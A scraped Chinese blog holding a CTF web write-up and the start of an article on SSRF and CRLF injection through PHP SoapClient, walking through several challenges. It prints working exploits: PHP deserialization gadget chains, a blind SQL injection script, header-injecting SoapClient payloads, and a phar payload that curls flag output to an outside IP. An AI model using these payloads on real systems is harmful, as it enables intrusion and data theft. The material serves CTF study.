后来才注意flag.php说他记录了所有购买者ip所以X-Forwarded-For:127.0.0.1访问即可 套娃先是要绕第一层，但是怎么看着就像我们nctf的题呢？ 12345678&lt;?php$query = $_SERVER['QUERY_STRING']; if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 )&#123; die('Y0u are So cutE!');&#125; if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t']))&#123; echo 使用b.u.p.t替代，以及在23333后加上%0a绕过preg_match() 第二层首先一堆jsfuck，扔Chrome控制台得到一个提示post Merak,传个值得到源码 12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); include 'takeip.php';ini_set('open_basedir','.'); include 'flag.php';if(isset($_POST['Merak']))&#123; highlight_file(__FILE__); die(); &#125; function change($v)&#123; $v = base64_decode($v); $re = ''; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re; &#125;echo 'Local access only!'.\"&lt;br/&gt;\";$ip = getIp();if($ip!='127.0.0.1')echo \"Sorry,you don't have permission! Your ip is :\".$ip;if($ip === '127.0.0.1' &amp;&amp; file_get_contents($_GET['2333']) === 'todat is a happy day' )&#123;echo \"Your REQUEST is:\".change($_GET['file']);echo file_get_contents(change($_GET['file'])); &#125;?&gt; 接着老套娃了。首先是getIp()函数，去官网查了下，是header可控。那就header设置为Client-IP:127.0.0.1然后为了file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39;这步老方法使用data协议data://text/plain,todat is a happy day最后一个file先用上面给的函数改改编码下即可。 Ezpoppop链构造,实话说三个类的pop很基础，不过我开始觉得这个起点贼诡异。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file='index.php')&#123; $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.\"&lt;br&gt;\"; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) &#123; echo \"hacker\"; $this-&gt;source = \"index.php\"; &#125; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;if(isset($_GET['pop']))&#123; @unserialize($_GET['pop']);&#125;else&#123; $a=new Show; highlight_file(__FILE__);&#125; 目标自然是include flag.php了。不过最好直接伪协议读。 首先要触发__toString那就先来个echo。也就是说还得再来个Show类对象置为它的source属性,echo时触发.Show类带Show类,讲究。 之后$this-&gt;str-&gt;source明显可以触发Test的__get()，然后返回值是函数，那就可以触发Modifer的__invoke()了。 很简单的链子，就是第一步自己开始犯傻以为__toString()触发是echo时自动就有的，想了半天确认应该还是得对象echo才会触发。这点不能混淆。poc: 12345678910111213141516171819202122&lt;?phpclass Modifier &#123; protected $var=\"php://filter/read=convert.base64-encode/resource=flag.php\";&#125;class Show&#123; public $source; public $str;&#125;class Test&#123; public $p;&#125;$a=new Show();$b=new Show();$a-&gt;source=$b;$b-&gt;str=new Test();$b-&gt;str-&gt;p=new Modifier();echo(urlencode(serialize($a))); Ezaudit提示audit那就看看源码泄露。发现www.zip，结果上来就只有一个index.php,还以为有很多源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php header('Content-type:text/html; charset=utf-8');error_reporting(0);if(isset($_POST['login']))&#123; $username = $_POST['username']; $password = $_POST['password']; $Private_key = $_POST['Private_key']; if (($username == '') || ($password == '') ||($Private_key == '')) &#123; // 若为空,视为未填写,提示错误,并3秒后返回登录界面 header('refresh:2; url=login.html'); echo \"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!\"; exit;&#125; else if($Private_key != '*************' ) &#123; header('refresh:2; url=login.html'); echo \"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!\"; exit; &#125; else&#123; if($Private_key === '************')&#123; $getuser = \"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'\".';'; $link=mysql_connect(\"localhost\",\"root\",\"root\"); mysql_select_db(\"test\",$link); $result = mysql_query($getuser); while($row=mysql_fetch_assoc($result))&#123; echo \"&lt;tr&gt;&lt;td&gt;\".$row[\"username\"].\"&lt;/td&gt;&lt;td&gt;\".$row[\"flag\"].\"&lt;/td&gt;&lt;td&gt;\"; &#125; &#125; &#125;&#125; // genarate public_key function public_key($length = 16) &#123; $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $public_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; &#125; //genarate private_key function private_key($length = 12) &#123; $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $private_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; &#125; $Public_key = public_key(); //$Public_key = KVQP0LdJKRaV3n9D how to get crispr's private_key??? 只要绕过一个私钥即可sql注入。那么注意到公,私钥是通过mt_rand()生成的，那就好说。直接./mt_r走起先将公钥转为脚本可识别的数据 1234567891011str1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'str2='KVQP0LdJKRaV3n9D'str3 = str1[::-1]length = len(str2)res=''for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' ' breakprint(res) 然后设定好随机数种子，按先公钥,再私钥的顺序生成。得到私钥XuNhoueCDCGc直接sql注入即可 1234567891011121314151617181920import requestsurl='http://aa90a604-c5bb-44d9-8589-b9614155f505.merak-ctf.site/login.php'flag=''for i in range(1,50): print(i) for str1 in \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.&#123;&#125;-\": payload = \"1' or if(ascii(substr(flag,\"+str(i)+\",1))=\"+str(ord(str1))+\",sleep(3),1)#\" data = &#123; 'username': 'admin', 'password': payload, 'Private_key': 'XuNhoueCDCGc', 'login': '1' &#125; try: r = requests.post(url, data=data,timeout=3) except requests.exceptions.ReadTimeout: flag += str1 print(flag) break 打开kali+爆破种子花了10多分钟，前几血又没了。心里苦。事后仔细一看sql语句已经写好了，所以只要万能密码就行了。难怪手速慢，该打。 Ezpop_revenge打算写wp就是为了这题。质量绝对够。开始下载www.zip的源码,然后发现是typeEcho的模板，之前没审过这个模板相关的pop链,上去找了下还挺有意思。跟zjy师傅审出了入口+利用点就懒得写poc了。不过还是得动手做做才行。（毕竟实际写起来多半直接拉胯） 首先是终结点 1234567&lt;?phpif(!isset($_SESSION)) session_start();if($_SERVER['REMOTE_ADDR']===\"127.0.0.1\")&#123; $_SESSION['flag']= \"MRCTF&#123;******&#125;\";&#125;else echo \"我扌your problem?\\nonly localhost can get flag!\";?&gt; 显然是要ssrf。而且这里让我莫名想到了之前LCTF的bestphp’srevenge.就是通过Soap打ssrf的一个trick.然后找入口了。这里难受的是phpstorm全局搜索找不到unserialize。还是zjy师傅帮我找到的.原来是插件里面手写的一个类主体函数大概这么多 12345678910111213141516171819class HelloWorld_DB&#123; private $flag=\"MRCTF&#123;this_is_a_fake_flag&#125;\"; private $coincidence; function __wakeup()&#123; $db = new Typecho_Db($this-&gt;coincidence['hello'], $this-&gt;coincidence['world']); &#125;&#125;public function action()&#123; if(!isset($_SESSION)) session_start(); if(isset($_REQUEST['admin'])) var_dump($_SESSION); if (isset($_POST['C0incid3nc3'])) &#123; if(preg_match(\"/file|assert|eval|[`\\'~^?&lt;&gt;$%]+/i\",base64_decode($_POST['C0incid3nc3'])) === 0) unserialize(base64_decode($_POST['C0incid3nc3'])); else &#123; echo \"Not that easy.\"; &#125; &#125; &#125; 注意到wakeup后自然明白反序列化的触发方式了.同时按照LCTF的经验，这里大概率是一个一个双参数函数，即call_user_func+Soap打ssrf。跟一下Typecho_Db类 果不其然有个call_user_func。而且参数都可控，链子结束。所以其实就是个原题魔改了下。当时看到这就没做了。 然而事情没这么简单。后来发现一个问题。那就是LCTF可以利用session处理器将Soap的序列化数据写到session里，然后call_user_func触发。这里却不行。那就需要把链子再多挖一下. 注意到之前的结尾提示我们__toString()。全局搜索下toString，跟到\\var\\Typecho\\Db\\Query.php下。注意到这里，$this-&gt;_sqlPreBuild[&#39;action&#39;]时执行了_adapter的parseSelect()方法。应该可以满足我们触发Soap的条件，即调用不存在方法。梳理完重点后开始构造了。 1234$db &#x3D; new Typecho_Db($this-&gt;coincidence[&#39;hello&#39;], $this-&gt;coincidence[&#39;world&#39;]);&#x3D;&gt;call_user_func(array($adapterName, &#39;isAvailable&#39;)) &#x3D;&gt; __toString()&#x2F;&#x2F;Typecho_Db_Query &#x3D;&gt; $this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild) 只用到两个类,pop链不长（hhh）poc 123456789101112131415161718192021222324252627class Typecho_Db_Query&#123; private $_adapter; private $_sqlPreBuild; function __construct()&#123; $target = \"http://127.0.0.1/flag.php\"; $headers = array( 'X-Forwarded-For:127.0.0.1', \"Cookie: PHPSESSID=b92shmac496iqkek97vkuetnn0\" ); $this-&gt;_adapter = new SoapClient(null, array('uri' =&gt; 'abc', 'location' =&gt; $target, 'user_agent' =&gt; 'byc404^^' . join('^^', $headers))); $this-&gt;_sqlPreBuild = ['action' =&gt; \"SELECT\"]; &#125;&#125;class HelloWorld_DB&#123; private $coincidence; public function __construct() &#123; $this-&gt;coincidence = array(\"hello\" =&gt; new Typecho_Db_Query()); &#125;&#125;$poc = serialize(new HelloWorld_DB());$poc = preg_replace(\" /\\^\\^/\", \"\\r\\n\", $poc);echo base64_encode($poc); 然后触发的地方没找到……原来在/var/Typeecho/Plugin.php里 123456public static function activate($pluginName)&#123; self::$_plugins['activated'][$pluginName] = self::$_tmp; self::$_tmp = array(); Helper::addRoute(\"page_admin_action\",\"/page_admin\",\"HelloWorld_Plugin\",'action');&#125; 那么就尝试提交poc。 1post: C0incid3nc3&#x3D;TzoxMzoiSGVsbG9Xb3JsZF9EQiI6MTp7czoyNjoiAEhlbGxvV29ybGRfREIAY29pbmNpZGVuY2UiO2E6MTp7czo1OiJoZWxsbyI7TzoxNjoiVHlwZWNob19EYl9RdWVyeSI6Mjp7czoyNjoiAFR5cGVjaG9fRGJfUXVlcnkAX2FkYXB0ZXIiO086MTA6IlNvYXBDbGllbnQiOjU6e3M6MzoidXJpIjtzOjM6ImFiYyI7czo4OiJsb2NhdGlvbiI7czoyNToiaHR0cDovLzEyNy4wLjAuMS9mbGFnLnBocCI7czoxNToiX3N0cmVhbV9jb250ZXh0IjtpOjA7czoxMToiX3VzZXJfYWdlbnQiO3M6Nzk6ImJ5YzQwNA0KWC1Gb3J3YXJkZWQtRm9yOjEyNy4wLjAuMQ0KQ29va2llOiBQSFBTRVNTSUQ9bW9pODU2cXVxcHU2bXV2bWhnYTdrbzdwNTMiO3M6MTM6Il9zb2FwX3ZlcnNpb24iO2k6MTt9czozMDoiAFR5cGVjaG9fRGJfUXVlcnkAX3NxbFByZUJ1aWxkIjthOjE6e3M6NjoiYWN0aW9uIjtzOjY6IlNFTEVDVCI7fX19fQ&#x3D;&#x3D; 然后?admin=1访问即可。然后应该是跟LCTF一样，最好payload跟检查flag的PHPSESSID不要用同一个。我看Nepnep师傅们的wp里说直接生成的payload过不去。我反正??????人家特意设定的base64encode根本不存在private特殊字符过不去的问题啊。反正我是可以直接打的,应该没啥问题。 大概这么多，题目毕竟新手题。收获谈不上，没掉链子就算满意了。最后一题也提醒了自己拒绝想当然，链子没写出来就不能空想，实在的poc才是王道。过几天把幽灵猫的总结下。毕竟国际赛上也遇到了。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"使用Soap的ssrf/crlf攻击","slug":"使用Soap的ssrf-crlf攻击","date":"2020-03-18T14:51:34.000Z","updated":"2021-02-18T05:08:38.115Z","comments":true,"path":"2020/03/18/使用Soap的ssrf-crlf攻击/","link":"","permalink":"https://www.bycsec.top/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/","excerpt":"这几天在buu上疯狂刷题。突然接触到了一个之前没有注意过的知识点。那就是使用Soap进行ssrf。目前做到的几道题个人觉得还是非常有营养的。那么干脆总结下关于php+Soap的相关知识。","text":"这几天在buu上疯狂刷题。突然接触到了一个之前没有注意过的知识点。那就是使用Soap进行ssrf。目前做到的几道题个人觉得还是非常有营养的。那么干脆总结下关于php+Soap的相关知识。 SoapSOAP是webService三要素（SOAP、WSDL、UDDI）之一： WSDL 用来描述如何访问具体的接口。 UDDI用来管理，分发，查询webService。 SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。 SoapClientPHP 的 SOAP 扩展可以用来提供和使用 Web Services这个扩展实现了6个类。其中有三个高级的类： SoapClient、SoapServer 和SoapFault，和三个低级类，它们是 SoapHeader、SoapParam 和 SoapVar。其构造方法如下： 1public SoapClient :: SoapClient （mixed $wsdl [，array $options ]） 第一个参数是用来指明是否是wsdl模式。通常我们构造时设为null即可。 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。 这里有趣的地方就在于两点 SoapClient是php的原生类。且它有一个__call()魔术方法 SoapClient的第二个参数允许我们自定义User-Agent 来依次解释下这两个有趣之处1.原生类说明我们不需要刻意去寻找php POPChain中的利用点。因为Soap已经提供给我们一个现成的魔术方法。而只要用Soap,我们就可以达成ssrf，可以打内网. 2.User-Agent可自定义带来的是CRLF注入的可能。为什么这么说？因为http header里有一个重要的Content-Type为和Content-Length。而User-Agent的http header位置正好在这些之上，所以可以进行覆盖。对于Content-Type，如果我们想要利用CRLF发送post请求，那么要求它为application/x-www-form-urlencode那么此时就可以利用CRLF，构造如下payload 12345$payload &#x3D; new SoapClient(null,array(&#39;user_agent&#39;&#x3D;&gt;&quot;test\\r\\nCookie: PHPSESSID&#x3D;08jl0ttu86a5jgda8cnhjtvq32\\r\\nContent-Type: application&#x2F;x-www-form-urlencoded\\r\\nContent-Length:45\\r\\n\\r\\nusername&#x3D;admin&amp;password&#x3D;nu1ladmin&amp;code&#x3D;470837\\r\\n\\r\\n\\r\\n&quot;,&#39;location&#39;&#x3D;&gt;$location,&#39;uri&#39;&#x3D;&gt;$uri)); CRLF与SSRF，这两个漏洞都可以通过SoapClient达成。 真题干说道理是不够的，这里直接把几天来做到的真题分析下。 踩坑： windows下开启SoapClient:SoapClient用到的是php扩展，需要在php.ini启用三个动态链接库 php_soap.dll php_openssl.dll php_curl.dll 这里我的ini文本中开始只找到一个未启用的库;extension=php_curl.dll，但是实际上在php的文件夹的ext里应该是可以全部找到的。所以需要把这三个文件名都启用（即去掉开头分号），并令其等于对应的扩展路径，这样就可以使用SoapClient了。 Linux安装一把梭就好，不必多说。 bestphp’s revenge题目源码index.php 123456789101112&lt;?phphighlight_file(__FILE__);$b = 'implode';call_user_func($_GET['f'], $_POST);session_start();if (isset($_GET['name'])) &#123; $_SESSION['name'] = $_GET['name'];&#125;var_dump($_SESSION);$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');call_user_func($b, $a);?&gt; flag.php 123456session_start();echo 'only localhost can get flag!';$flag = 'LCTF&#123;*************************&#125;';if($_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\")&#123; $_SESSION['flag'] = $flag; &#125; 题目有几个重点，我们先从结果看起。flag在flag.php中，想要读到flag，必然需要从127.0.0.1访问，然后flag会被保存在session值中。显然是个ssrf了。那么我们看看index.php中的代码var_dump($_SESSION);首先确认session的值会被打印出来。既然如此，那看来我们的目标就是ssrf了。再来看看其他函数需要怎么利用。很唐突的一个$b = &#39;implode&#39;;+call_user_func($_GET[&#39;f&#39;], $_POST);以及最后一个call_user_func($b, $a);这里b紧接着一个call_user_func看来是可以变量覆盖了。那么如果覆盖了的话，覆盖成什么，又怎么利用呢？这里需要知道一点： call_user_func()函数如果传入的参数是array类型的话，会将数组的成员当做类名和方法 ‘假如我们一开始利用f将b覆盖成 call_user_func()，那么在index.php的最后，函数将执行calluserfunc(calluserfunc,array($_session,‘welcome_to_the_lctf2018’))由于$_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];可控，如果令name=SoapClient，不就成了 1call_user_func(SoapClient-&gt;welcome_to_the_lctf2018) 吗？前面提到，如果SoapClient存在__call()魔术方法，调用不存在的方法将直接触发我们所需要的ssrf.那么整个流程的最后一步可以先行构造： 12345678&lt;?php$target = \"http://127.0.0.1/flag.php\";$attack = new SoapClient(null,array('location' =&gt; $target, 'user_agent' =&gt; \"byc\\r\\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\\r\\n\", 'uri' =&gt; \"123\"));$payload = urlencode(serialize($attack));echo $payload;?&gt; 注意的是，这里还用到了我们上面提到的CRLF漏洞 1&#39;user_agent&#39; &#x3D;&gt; &quot;byc\\r\\nCookie: PHPSESSID&#x3D;g6ooseaeo905j0q4b9qqn2n471\\r\\n&quot;, 看，只要\\r\\n，我们就可以控制访问时的Cookie,这样最后生效的flag也会被保存在我们可控的cookie中 下面要思考的就是，怎么触发反序列化呢？联系到题目中敏感的session存储，自然可以联想到某个不用unserialize也能触发的反序列化漏洞：phpsession处理器引擎不一致导致的反序列化。那么问题就解决了：我们在最开始就令引擎为php_serialize，并将序列化数据存储到session中。然后在第二次才进行ssrf。此时由于处理器重新变回php，将触发反序列化，从而触发ssrf，将flag存储在可控cookie中。最后换cookie访问即可。poc： 123456781.f&#x3D;session_start&amp;name&#x3D;|O%3A10%3A%22SoapClient%22%3A5......同时post serizliaze_handler&#x3D;php_serialize这样执行的就是session_start(&quot;serialize_handler&quot;:&#39;php_serialize&#39;)我们的数据被成功写入session2.f&#x3D;extract&amp;name&#x3D;SoapClient同时post b&#x3D;calluserfunc这样执行的就是calluserfunc(calluserfunc,array($_session,‘welcome_to_the_lctf2018’)) 最后换cookie访问index.php就能拿到flag了。 De1CTF shellshellshell超级麻烦的一道题……可能是因为我懒得写自动化脚本吧。看到赵师傅的wp直接自动化一把梭羡慕不已。这题其他细节我就不讲了，主要重点讲讲中间利用Soap的部分首先题目在登录进去后有个点，这里signature变量可以构造下时间盲注。因为反引号+正则替换的使用不当，导致了可注的地方，于是可以得到管理员的账号密码。大概是这种形式吧 11&#96; or sleep(3) ,1)# 但是尝试登录时却提示需要从本地登进，这就是说要ssrf了。怎么达成呢?因为我环境懒得重开了，借用下其他师傅的图虽然将mood参数转int并addshalshes了，但是后面mood参数在可以注入的signnature参数后面，所以可以通过注入将其直接注释掉，来注入一个我们的恶意序列化对象然后调用了一个getcountry()方法，结合我们之前的需求，正好可以使用SoapClient。只要使用Soap构造一个登陆admin的请求，序列化后插入数据库，这里调用不存在方法时就能直接触发__call()进而触发ssrf。 1234567891011&lt;?php$target = \"http://127.0.0.1/index.php?action=login\";$post_string = 'username=admin&amp;password=jaivypassword&amp;code=4153792';$headers = array( 'Cookie: PHPSESSID=pu1bnms95shhapubhqoh9vk7h2',);$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'byc^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string.'^^','uri'=&gt;'hello'));$aaa = serialize($b);$aaa = str_replace('^^',\"\\r\\n\",$aaa);echo '0x'.bin2hex($aaa);?&gt; 稍微解释下要点，我们需要的是ssrf登录admin，那么到时候反序列化触发完了，我们自己登进去，需要的就是一个满足条件的cookie。同时因为要构造的请求必须是登录时包含了admin的账号密码以及验证码的数据，所以需要post请求。这里又一次用到CRLF，来控制Content-Type，Content-Length,达成post请求的条件。 那么此时最好重开一个浏览器，直接使用新界面的cookie以及算好的验证码放到脚本中，得到16进制的序列化数据。然后在已经登录的位置注入序列化数据。这时会自动跳到index界面，触发序列化。（我直接遇到500,但是不影响）之后再回到原先未登录的地方登录就好了。 后面的部分不提了，昨天做了我一下午……可以参考赵师傅或者其他师傅的wphttps://www.zhaoj.in/read-6170.htmlhttps://blog.csdn.net/chasingin/article/details/104687766 SUCTF UploadLabs2这题也是给出源码，然后审计首先是Ad类一个诱人的析构方法 123function __destruct()&#123; system($this-&gt;cmd); &#125; 来看看达成条件需要ssrf，不用说这里应该又可以想到我们的Soap类了。然后看看有没有可用的方法，很快在File类中找到 12345function __wakeup()&#123; $class = new ReflectionClass($this-&gt;func); $a = $class-&gt;newInstanceArgs($this-&gt;file_name); $a-&gt;check();&#125; 这里ReflectionClass是php中反射类的意思。所以其实wakeup的前两行就是执行了一个实例化对象的作用 12$class &#x3D; new ReflectionClass(&#39;Person&#39;); &#x2F;&#x2F; 建立 Person这个类的反射类 $instance &#x3D; $class-&gt;newInstanceArgs($args); &#x2F;&#x2F; 相当于实例化Person 类 加上那个$a-&gt;check();我们基本确定这里就是用Soap类来构造了。接下来联系func.php中传参实例化File对象的做法， 1234$file_path = $_POST['url']; $file = new File($file_path); $file-&gt;getMIME(); echo \"&lt;p&gt;Your file type is '$file' &lt;/p&gt;\"; 不难想到使用phar来触发反序列化，这样我们的File类在实例化后，被触发反序列化，调用__wakeup()，只要func是SoapClient就能进行后续的ssrf，达成任意命令执行了。 123456789101112131415161718192021222324252627&lt;?phpclass File&#123; public $file_name; public $func='SoapClient'; function __construct()&#123; $target = \"http://127.0.0.1/admin.php\"; $post_string = 'admin=&amp;cmd=curl http://174.1.28.1:8877/?`/readflag`&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='. \"\\r\\n\"; $headers = []; $this-&gt;file_name=[ null, array('location' =&gt; $target, 'user_agent'=&gt;str_replace('^^', \"\\r\\n\",'byc^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string.'^^') ,'uri'=&gt;'hello') ]; &#125;&#125;$a=new File();echo urlencode(serialize($a));@unlink(\"1.phar\");$phar = new Phar(\"1.phar\"); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(\"&lt;script language='php'&gt; __HALT_COMPILER(); &lt;/script&gt;\"); //设置stub$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest$phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件$phar-&gt;stopBuffering();rename('1.phar','1.jpg'); 同样提几个细节： Soap的参数中file_name被设为数组是反射类的一个特点，它接收的是数组参数。 phar的文件名已经改成jpg了，但是为了过一个文件头的校验还得设定$phar-&gt;setStub(&quot;&lt;script language=&#39;php&#39;&gt; __HALT_COMPILER(); &lt;/script&gt;&quot;); post数据除了cmd跟admin外，还要注意Ad在析构前调用的另外一个check()方法中接收的参数，他们都是反射类实例化的而我们只需要传存在的类跟方法即可。比如SplStack就是php标准库里数据结构类，push方法也是自然存在的。所以上传1.jpg,在func.php调用php://filter/resource=phar://upload/76d9f00467e5ee6abc3ca60892ef304e/f3ccdd27d2000e3f9255a7e3e2c48800.jpg触发反序列化。 这里我往buu的requestsbin打payload没收到不止没收到，直接死在文件流那了。它报的我文件是ost-stream。命令执行失败。 用它的内网靶机就没事？好吧，还是有flag的hhh. SWPU2019 web6上来一个sql的万能密码，用到了with rollup的trick1’ or ‘1’=’1’ group by passwd with rollup having passwd is NULL – -添加一个空列，进行结果判断NULL=false绕过弱类型相等 进去后发现wsdl.php提供了不少接口，其中一个可以读文件把可读的文件读一下index.php 12345678910111213141516171819202122232425262728293031323334353637383940414243 &lt;?phpob_start();include (\"encode.php\");include(\"Service.php\");//error_reporting(0);//phpinfo();$method = $_GET['method']?$_GET['method']:'index';//echo 1231;$allow_method = array(\"File_read\",\"login\",\"index\",\"hint\",\"user\",\"get_flag\");if(!in_array($method,$allow_method))&#123; die(\"not allow method\");&#125;if($method===\"File_read\")&#123; $param =$_POST['filename']; $param2=null;&#125;else&#123; if($method===\"login\") &#123; $param=$_POST['username']; $param2 = $_POST['passwd']; &#125;else &#123; echo \"method can use\"; &#125;&#125;echo $method;$newclass = new Service();echo $newclass-&gt;$method($param,$param2);ob_flush();?&gt; Surface.php 123456&lt;?php include('Service.php'); $ser = new SoapServer('Service.wsdl',array('soap_version'=&gt;SOAP_1_2)); $ser-&gt;setClass('Service'); $ser-&gt;handle();?&gt; se.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?phpini_set('session.serialize_handler', 'php');class aa&#123; public $mod1; public $mod2; public function __call($name,$param) 调用函数，显然可跟进到invoke &#123; if($this-&gt;&#123;$name&#125;) &#123; $s1 = $this-&gt;&#123;$name&#125;; $s1(); &#125; &#125; public function __get($ke) &#123; return $this-&gt;mod2[$ke]; &#125;&#125;class bb&#123; public $mod1; public $mod2; public function __destruct() 入手点，显然可跟进到__call &#123; $this-&gt;mod1-&gt;test2(); &#125;&#125; class cc&#123; public $mod1; public $mod2; public $mod3; public function __invoke() &#123; $this-&gt;mod2 = $this-&gt;mod3.$this-&gt;mod1; 拼接,那么有字符串了 &#125; &#125;class dd&#123; public $name; public $flag; public $b; public function getflag() 此处可ssrf，到头了 &#123; session_start(); var_dump($_SESSION); $a = array(reset($_SESSION),$this-&gt;flag); echo call_user_func($this-&gt;b,$a); &#125;&#125;class ee&#123; public $str1; public $str2; public function __toString() &#123; $this-&gt;str1-&gt;&#123;$this-&gt;str2&#125;(); 有字符串了，只有他能调用对象的方法，当然是ssrf return \"1\"; &#125;&#125;$a = $_POST['aa'];unserialize($a);?&gt; encode.php 123456789101112131415161718192021222324252627&lt;?phpfunction en_crypt($content,$key)&#123; $key = md5($key); $h = 0; $length = strlen($content); $swpuctf = strlen($key); $varch = ''; for ($j = 0; $j &lt; $length; $j++) &#123; if ($h == $swpuctf) &#123; $h = 0; &#125; $varch .= $key&#123;$h&#125;; $h++; &#125; $swpu = ''; for ($j = 0; $j &lt; $length; $j++) &#123; $swpu .= chr(ord($content&#123;$j&#125;) + (ord($varch&#123;$j&#125;)) % 256); &#125; return base64_encode($swpu);&#125; 找到不可读的方法 get_flag，得知要点： get_flag only admin in 127.0.0.1 can get_flag ssrf needed POPchain needed decrypt and be admin 先看popchain 12345bb-&gt;__destruct &#x2F;&#x2F;$mod1 为aa对象 -&gt;aa -&gt;_call()-&gt;$s1(); &#x2F;&#x2F;$需要调用的$s1是个对象 -&gt;cc-&gt; __invoke()-&gt; &#x2F;&#x2F;拼接，需要属性是字符串 ee-&gt;_toString()-&gt; &#x2F;&#x2F;$str1是dd对象-&gt;getflag() dd-&gt;getflag() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phpclass aa&#123; public $mod1; public $mod2;&#125;class bb&#123; public $mod1; public $mod2;&#125; class cc&#123; public $mod1; public $mod2; public $mod3;&#125;class dd&#123; public $name; public $flag; public $b;&#125;class ee&#123; public $str1; public $str2;&#125;$ee=new ee();$ee-&gt;str1=new dd();$ee-&gt;str2='getflag';$cc=new cc();$cc-&gt;mod3='1';$cc-&gt;mod1=$ee;$aa=new aa();$aa-&gt;mod1=$cc;$aa-&gt;mod2=array('test2'=&gt;&amp;$aa-&gt;mod1);$bb=new bb();$bb-&gt;mod1=$aa;$ee-&gt;str1-&gt;b='call_user_func';$ee-&gt;str1-&gt;flag='get_flag';$sa=serialize($bb);echo $sa; 这题类似bestphp’srevenge，所以前面的链好了后可以直接把getflag()用到的两个参数填好。原理是一样的。链子好了,回头看看解码 12345678910111213141516171819202122function de_crypt($swpu,$key)&#123; $swpu=base64_decode($swpu); $key=md5($key); $h=0; $length=strlen($swpu); $swpuctf=strlen($key); $varch=''; for($j=0;$j&lt;$length;$j++)&#123; if($h==$swpuctf) &#123; $h=0; &#125; $varch.=$key&#123;$h&#125;; $h++; &#125; $content=''; for($j=0;$j&lt;$length;$j++) &#123; $content.= chr(ord($swpu&#123;$j&#125;) - (ord($varch&#123;$j&#125;))+256 % 256); &#125; return $content;&#125; 解码cookie得到xiaoC:3那就加密伪造adminadmin:1 xZmdm9NxaQ== 现在差一个Sopa打127.0.0.1调用getflag需要注意的是interface.php已经有现成的soap接口了，所以不能直接访问index.php调用get_flag。而是通过call_user_func调用SoapClient类的get_flag方法即调用了Service类的get_flag方法先将数据写入session 123456789101112&lt;?$target = 'http://127.0.0.1/interface.php';$headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: user=xZmdm9NxaQ==',);$b = new SoapClient(null, array('location' =&gt; $target, 'user_agent'=&gt;'byc^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers),'uri'=&gt;'aabb'));$a = serialize($b);$a = str_replace('^^', \"\\r\\n\", $a);echo $a;?&gt; 利用表单传进session 123456789&lt;html&gt;&lt;body&gt; &lt;form 